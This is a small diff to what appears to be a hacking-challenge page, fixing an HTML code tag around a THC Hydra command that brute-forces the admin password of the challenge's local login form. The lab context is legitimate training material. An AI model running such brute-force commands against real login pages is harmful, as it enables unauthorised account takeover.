@@ -8,4 +8,4 @@ https://github.com/vanhauser-thc/thc-hydra
 
 In the HTML code you can find the command to start the brute-force attack.
 
-<codehydra -V -f -l admin -x 4:6:a -s 8080 localhost http-post-form "/challenges/dontbelazy/:username=admin&password=^PASS^&submit=Login:S=You found the correct:H=Cookie: PHPSESSID=<?= $_COOKIE['PHPSESSID'] ?></code>
+<code>hydra -V -f -l admin -x 4:6:a -s 8080 localhost http-post-form "/challenges/dontbelazy/:username=admin&password=^PASS^&submit=Login:S=You found the correct:H=Cookie: PHPSESSID=<?= $_COOKIE['PHPSESSID'] ?></code>
